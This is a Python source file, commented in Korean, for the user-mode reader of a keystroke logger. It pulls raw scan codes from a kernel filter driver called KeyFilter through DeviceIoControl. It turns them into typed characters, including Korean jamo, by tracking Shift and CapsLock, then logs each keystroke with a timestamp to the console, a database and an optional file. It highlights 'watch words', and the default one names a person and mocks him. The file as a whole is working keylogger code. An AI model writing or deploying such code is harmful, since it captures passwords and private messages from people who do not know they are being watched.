"""
reader.py — 유저 모드 키 로그 리더
=====================================
KeyFilter.sys 드라이버에 IOCTL 로 키스트로크를 요청해서 출력합니다.

[문자 변환 방식]
  Windows ToUnicodeEx API 사용:
    스캔코드 → MapVirtualKeyExW → 가상키코드
    가상키코드 + 현재 키보드 레이아웃 → ToUnicodeEx → 실제 유니코드 문자

  덕분에 한국어(두벌식), 영어, 특수문자 등 모든 레이아웃 자동 지원.
  Shift / CapsLock 상태도 실시간 추적.
"""

from __future__ import annotations

import argparse
import ctypes
import ctypes.wintypes
import io
import struct
import sys
import time
from datetime import datetime, timezone, timedelta

import store

# ── Windows CMD UTF-8 출력 설정 ───────────────────────────────────────────────
# chcp 65001 없이도 한국어가 깨지지 않도록 (이 파일은 Windows 전용)
sys.stdout = io.TextIOWrapper(
    sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True
)
sys.stderr = io.TextIOWrapper(
    sys.stderr.buffer, encoding="utf-8", errors="replace"
)
# 콘솔 코드페이지를 UTF-8로 강제 설정
ctypes.windll.kernel32.SetConsoleOutputCP(65001)
ctypes.windll.kernel32.SetConsoleCP(65001)

# ── Windows API ───────────────────────────────────────────────────────────────
_k32  = ctypes.windll.kernel32
_u32  = ctypes.windll.user32

GENERIC_READ         = 0x80000000
OPEN_EXISTING        = 3
INVALID_HANDLE       = ctypes.wintypes.HANDLE(-1).value
IOCTL_KEYFILTER_READ = 0x000B2000   # CTL_CODE(0xB, 0x800, 0, 0)
# 계산: (0xB<<16)|(0<<14)|(0x800<<2)|0 = 0xB0000|0|0x2000|0 = 0x000B2000

KEY_RECORD_FMT  = "<qHHHH"          # int64 + uint16*4 = 16 bytes (Timestamp+UnitId+MakeCode+Flags+Reserved)
KEY_RECORD_SIZE = struct.calcsize(KEY_RECORD_FMT)
RECORDS_PER_CALL = 64
BUFFER_SIZE      = KEY_RECORD_SIZE * RECORDS_PER_CALL

KEY_MAKE  = 0x00
KEY_BREAK = 0x01
KEY_E0    = 0x02    # 확장 키 플래그

# MapVirtualKeyExW 변환 타입
MAPVK_VSC_TO_VK = 1   # 스캔코드 → 가상 키코드

WINDOWS_EPOCH_DIFF_SEC = 11644473600   # 1601→1970 차이(초)

# ── 특수키 스캔코드 → 이름 테이블 ─────────────────────────────────────────────
# ToUnicodeEx 가 변환 못하는 제어키들만 여기서 처리
SPECIAL_KEYS: dict[int, str] = {
    0x01: "[ESC]",
    0x0E: "[Backspace]",
    0x0F: "[Tab]",
    0x1C: "[Enter]",
    0x1D: "[Ctrl]",
    0x2A: "[LShift]",
    0x36: "[RShift]",
    0x37: "[PrtSc]",
    0x38: "[Alt]",
    0x39: "[Space]",
    0x3A: "[CapsLock]",
    0x3B: "[F1]",  0x3C: "[F2]",  0x3D: "[F3]",  0x3E: "[F4]",
    0x3F: "[F5]",  0x40: "[F6]",  0x41: "[F7]",  0x42: "[F8]",
    0x43: "[F9]",  0x44: "[F10]", 0x57: "[F11]", 0x58: "[F12]",
    0x45: "[NumLock]",  0x46: "[ScrollLock]",
    0x47: "[Home]",     0x48: "[Up]",      0x49: "[PgUp]",
    0x4B: "[Left]",     0x4D: "[Right]",
    0x4F: "[End]",      0x50: "[Down]",    0x51: "[PgDn]",
    0x52: "[Ins]",      0x53: "[Del]",
    0x5B: "[LWin]",     0x5C: "[RWin]",   0x5D: "[Menu]",
}


# ── 키보드 상태 추적 ──────────────────────────────────────────────────────────
class KeyboardState:
    """
    Shift / CapsLock / Ctrl / Alt 상태를 키스트림으로 추적.
    ToUnicodeEx 에 전달할 256-byte 배열을 관리합니다.

    [학습 노트]
      Windows 의 GetKeyboardState() 는 현재 스레드 기준이라
      다른 스레드(드라이버 폴러)에서는 정확하지 않습니다.
      따라서 스캔코드 스트림을 직접 파싱해 상태를 유지합니다.
    """

    # 자주 쓰는 VK 코드
    VK_SHIFT   = 0x10
    VK_CONTROL = 0x11
    VK_MENU    = 0x12   # Alt
    VK_CAPITAL = 0x14   # CapsLock
    VK_LSHIFT  = 0xA0
    VK_RSHIFT  = 0xA1
    VK_LCTRL   = 0xA2
    VK_RCTRL   = 0xA3

    def __init__(self) -> None:
        self._ks = (ctypes.c_ubyte * 256)()   # 0x80 = pressed, 0x01 = toggled

    def update(self, scan_code: int, flags: int) -> None:
        """키 이벤트로 상태 갱신."""
        down = not (flags & KEY_BREAK)
        pressed = 0x80 if down else 0x00

        if scan_code == 0x2A:                          # LShift
            self._ks[self.VK_LSHIFT] = pressed
            self._ks[self.VK_SHIFT]  = pressed or self._ks[self.VK_RSHIFT]
        elif scan_code == 0x36:                        # RShift
            self._ks[self.VK_RSHIFT] = pressed
            self._ks[self.VK_SHIFT]  = pressed or self._ks[self.VK_LSHIFT]
        elif scan_code == 0x1D:                        # Ctrl
            vk = self.VK_RCTRL if (flags & KEY_E0) else self.VK_LCTRL
            self._ks[vk]              = pressed
            other = self.VK_LCTRL if vk == self.VK_RCTRL else self.VK_RCTRL
            self._ks[self.VK_CONTROL] = pressed or self._ks[other]
        elif scan_code == 0x38:                        # Alt
            self._ks[self.VK_MENU]   = pressed
        elif scan_code == 0x3A and down:               # CapsLock 토글
            self._ks[self.VK_CAPITAL] ^= 0x01

    @property
    def array(self) -> ctypes.Array:
        return self._ks


# ── 스캔코드 → 유니코드 문자 변환 ────────────────────────────────────────────
def _get_layout() -> int:
    """포어그라운드 창의 키보드 레이아웃 핸들 반환 (한국어/영어 자동 감지)."""
    try:
        hwnd = _u32.GetForegroundWindow()
        tid  = _u32.GetWindowThreadProcessId(hwnd, None)
        return _u32.GetKeyboardLayout(tid)
    except Exception:
        return 0


def scancode_to_char(scan_code: int, flags: int, ks: ctypes.Array) -> str:
    """
    스캔코드 → 실제 입력 문자 변환.

    우선순위:
      1. 특수키(SPECIAL_KEYS) → 이름 반환  예) [Enter]
      2. ToUnicodeEx          → 유니코드    예) 'ㅎ', 'A', '!'
      3. 폴백                 → [SC:0xXX]

    [한국어 동작 원리]
      두벌식 레이아웃에서 'G' 키 스캔코드(0x22) 를 입력하면:
        MapVirtualKeyExW(0x22, MAPVK_VSC_TO_VK, KOR_LAYOUT) → VK_G
        ToUnicodeEx(VK_G, 0x22, ks, buf, 8, 0, KOR_LAYOUT)  → 'ㅎ'
      IME 조합(ㅎ+ㅏ+ㄴ → 한)은 유저모드 TSF 에서 처리되므로
      커널에서는 낱자(jamo)로 캡처됩니다.
    """
    # 키업은 위 화살표 접두어만 붙여 반환
    is_break = bool(flags & KEY_BREAK)

    # 1. 특수키 테이블에 있으면 바로 반환
    if scan_code in SPECIAL_KEYS:
        name = SPECIAL_KEYS[scan_code]
        return f"↑{name}" if is_break else name

    if is_break:
        return ""   # 일반 문자 키업은 표시 안 함

    # 2. ToUnicodeEx 로 유니코드 변환
    layout = _get_layout()
    vk     = _u32.MapVirtualKeyExW(scan_code, MAPVK_VSC_TO_VK, layout)
    if vk:
        buf = ctypes.create_unicode_buffer(8)
        n   = _u32.ToUnicodeEx(vk, scan_code, ks, buf, 8, 0, layout)
        if n > 0:
            ch = buf.value[:n]
            # 제어문자(0x00~0x1F) 는 이름으로 표시
            if len(ch) == 1 and ord(ch) < 0x20:
                return f"[Ctrl+{chr(ord(ch) + 0x40)}]"
            return ch
        if n < 0:
            # Dead key (조합 문자 대기 중) — 버퍼 클리어
            _u32.ToUnicodeEx(vk, scan_code, ks, buf, 8, 0, layout)
            return f"[dead]"

    # 3. 폴백
    return f"[SC:0x{scan_code:02X}]"


def filetime_to_datetime(ts_100ns: int) -> datetime:
    """Windows FILETIME → KST datetime."""
    unix_sec = (ts_100ns / 1e7) - WINDOWS_EPOCH_DIFF_SEC
    kst = timezone(timedelta(hours=9))
    return datetime.fromtimestamp(unix_sec, tz=kst)


# ── 드라이버 통신 ─────────────────────────────────────────────────────────────
class KeyFilterReader:
    def __init__(self) -> None:
        self._handle: int | None = None

    def open(self) -> None:
        h = _k32.CreateFileW(
            r"\\.\KeyFilter", GENERIC_READ, 0, None, OPEN_EXISTING, 0, None
        )
        if h == INVALID_HANDLE:
            err = _k32.GetLastError()
            raise OSError(
                f"드라이버 열기 실패 (오류: {err})\n"
                "  sc query KeyFilter  로 로드 여부 확인\n"
                "  관리자 권한으로 실행했는지 확인"
            )
        self._handle = h
        print(f"[+] 드라이버 연결 성공 (핸들: {h})")

    def close(self) -> None:
        if self._handle is not None:
            _k32.CloseHandle(self._handle)
            self._handle = None

    def read_records(self) -> list[tuple[datetime, int, int]]:
        if self._handle is None:
            return []
        buf      = ctypes.create_string_buffer(BUFFER_SIZE)
        returned = ctypes.wintypes.DWORD(0)
        ok = _k32.DeviceIoControl(
            self._handle, IOCTL_KEYFILTER_READ,
            None, 0, buf, BUFFER_SIZE, ctypes.byref(returned), None
        )
        if not ok:
            raise OSError(f"DeviceIoControl 실패 (오류: {_k32.GetLastError()})")
        records = []
        n = returned.value // KEY_RECORD_SIZE
        for i in range(n):
            ts_100ns, _, make_code, flags, _ = struct.unpack_from(
                KEY_RECORD_FMT, buf, i * KEY_RECORD_SIZE
            )
            records.append((filetime_to_datetime(ts_100ns), make_code, flags))
        return records

    def __enter__(self):  self.open();  return self
    def __exit__(self, *_): self.close()


# ── 출력 포맷 ────────────────────────────────────────────────────────────────
RESET  = "\033[0m"
GRAY   = "\033[90m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"


def format_line(ts_str: str, key_str: str, watch_words: list[str]) -> str:
    is_special = key_str.startswith("[") or key_str.startswith("↑")
    col = YELLOW if is_special else GREEN

    hit = any(isinstance(w, str) and w and w in key_str for w in (watch_words or []))
    prefix = f"{RED}⚠ {RESET}" if hit else "  "
    if hit:
        col = RED

    return f"{GRAY}{ts_str}{RESET}  {prefix}{col}{key_str}{RESET}"


# ── 메인 ─────────────────────────────────────────────────────────────────────
def main() -> None:
    parser = argparse.ArgumentParser(description="KeyFilter 드라이버 로그 리더")
    parser.add_argument("--dump",      action="store_true", help="버퍼 한 번만 읽고 종료")
    parser.add_argument("--log",       metavar="FILE",      help="텍스트 로그 파일")
    parser.add_argument("--watch",     metavar="WORD", nargs="*",
                        default=["한창수 바보"], help="감시 단어")
    parser.add_argument("--show-up",   action="store_true", help="키업 이벤트도 표시")
    args = parser.parse_args()

    log_file = open(args.log, "a", encoding="utf-8") if args.log else None

    db = store.get_conn()
    store.init(db)

    kb_state = KeyboardState()   # Shift/CapsLock 추적

    print("KeyFilter 로그 리더  (Ctrl+C 로 종료)")
    print(f"감시 단어 : {args.watch}")
    print(f"DB 저장   : {store.DB_PATH}")
    print("─" * 55)

    try:
        with KeyFilterReader() as reader:
            while True:
                records = reader.read_records()

                for dt, make_code, flags in records:
                    # 상태 먼저 갱신 (Shift/CapsLock)
                    kb_state.update(make_code, flags)

                    # 문자 변환
                    key_str = scancode_to_char(make_code, flags, kb_state.array)

                    # 키업 필터링 (--show-up 없으면 일반 문자 키업 숨김)
                    if not key_str:
                        continue
                    if not args.show_up and key_str.startswith("↑"):
                        continue

                    ts_str = dt.strftime("%H:%M:%S.%f")[:-3]

                    # DB 저장
                    store.insert(db, key_str, int(dt.timestamp() * 1000))

                    # 출력
                    print(format_line(ts_str, key_str, args.watch))

                    # 파일 로그
                    if log_file:
                        log_file.write(f"{ts_str}  {key_str}\n")
                        log_file.flush()

                if args.dump:
                    break

                time.sleep(0.03)   # 30ms 폴링

    except KeyboardInterrupt:
        print("\n[*] 종료")
    except OSError as e:
        print(f"\n[!] {e}", file=sys.stderr)
        sys.exit(1)
    finally:
        if log_file:
            log_file.close()


if __name__ == "__main__":
    main()
